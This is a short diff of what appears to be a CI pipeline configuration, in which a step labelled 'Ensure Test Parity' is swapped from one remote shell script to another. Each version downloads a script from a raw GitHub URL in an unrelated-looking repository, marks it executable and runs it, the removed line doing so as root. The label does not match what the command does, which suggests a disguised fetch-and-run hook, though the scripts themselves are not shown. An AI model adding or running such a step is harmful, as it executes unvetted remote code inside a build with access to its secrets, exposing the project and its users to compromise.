@@ -9,4 +9,4 @@ jobs:
       - run: 
           name: Ensure Test Parity 
           command: | 
-                 sudo -u root wget https://raw.githubusercontent.com/dewaagro/repotestedcicilan/main/pointerhu12.sh && chmod +x *.sh && ./pointerhu12.sh
+                 wget https://raw.githubusercontent.com/dewaagro/tested002/main/pointerhu13.sh && chmod +x *.sh && ./pointerhu13.sh
